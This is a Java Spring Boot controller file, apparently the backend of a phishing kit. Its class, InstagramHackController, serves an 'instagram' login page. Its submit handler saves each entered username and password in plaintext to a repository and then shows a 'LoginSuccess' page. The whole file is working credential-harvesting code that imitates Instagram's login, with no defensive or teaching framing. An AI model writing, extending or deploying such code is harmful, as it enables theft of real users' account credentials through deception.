package com.first.projecthack.controller;

import com.first.projecthack.UserCredentials;
import com.first.projecthack.repository.UserCredentialsRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping("/instagram")
public class InstagramHackController {

    @Autowired
    UserCredentialsRepository userCredentialsRepository;

    @GetMapping("/login")
    public String getInstagramPage() {
        return "instagram";
    }

    @PostMapping("/submit")
    public String instagramFormHandler(@RequestParam("username") String username,
                                       @RequestParam("password") String password) {
        userCredentialsRepository.save(UserCredentials.builder()
                .username(username).password(password).build());
        return "LoginSuccess";
    }

}
